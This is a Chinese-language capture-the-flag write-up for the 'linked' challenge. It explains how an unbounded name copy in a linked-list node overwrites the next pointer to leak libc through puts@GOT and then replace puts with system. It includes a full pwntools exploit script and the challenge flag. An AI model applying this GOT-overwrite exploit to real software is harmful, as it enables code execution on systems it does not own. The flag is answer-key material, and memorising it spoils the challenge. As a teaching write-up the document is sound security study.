# linked

## 题目简述

日历程序的链表节点包含 `int time`、`char name[128]` 和 `event *next`。复制名称的 `inpcpy` 一直写到换行，不检查 128 字节边界。二进制非 PIE 且只有 Partial RELRO，因此可以把首节点的 `next` 覆盖为 `puts@GOT`：显示链表时先泄漏 GOT 中的 libc 地址，第二轮添加事件时又把 GOT 当成可写节点，最终把 `puts` 改为 `system`。

## 解题过程

`name` 从节点偏移 4 开始，`next` 位于偏移 136，所以从 `name` 起写 132 字节就到达 `next`。首轮令时间为 1，名称为 `b"a"*132 + p64(puts_got)`。`displayEvents` 第二次迭代会把 `puts@GOT` 当作节点：其前 4 字节按 `time` 打印，后续字节从 `name` 位置继续按字符串输出，合并即可恢复 6 字节 libc 指针。

```python
from pwn import ELF, p64, remote

elf = ELF("./bin/chall")
libc = ELF("./bin/libc.so.6")
io = remote("challenge-host", 12345)

puts_got = elf.got["puts"]
io.sendline(b"1")
io.sendline(b"a" * 132 + p64(puts_got))

# 越界名称会先打印被伪造的 next；随后一行来自 puts@GOT 伪节点。
io.recvuntil(p64(puts_got)[:3] + b"\n")
line = io.recvline()
low = int(line.split(b":", 1)[0]).to_bytes(4, "little")
high = line.strip().split()[-1]
puts_address = int.from_bytes(low + high, "little")

libc.address = puts_address - libc.symbols["puts"]
system_address = libc.symbols["system"]
system_bytes = p64(system_address)

# 第二轮 cur 指向 puts@GOT：time 写低 4 字节，name 写高 4 字节。
io.sendline(str(int.from_bytes(system_bytes[:4], "little")).encode())
io.sendline(system_bytes[4:])

# 后续源码本来就调用 puts("cat flag.txt")，现等价于 system("cat flag.txt")。
print(io.recvall().decode(errors="replace"))
```

最终输出：

```text
tjctf{i_h0pe_my_tre3s_ar3nt_b4d_too}
```

## 方法总结

- 核心技巧：用链表节点名称溢出伪造 `next`，先把 GOT 当节点泄漏 libc，再把同一 GOT 当节点字段覆盖。
- 识别信号：无界复制紧邻链表指针、遍历信任 `size/next`，并且 GOT 在 Partial RELRO 下可写。
- 复用要点：先根据结构体对齐计算 `name→next` 的真实距离；泄漏被拆成整数和字符串两段时，要按小端顺序准确重组。
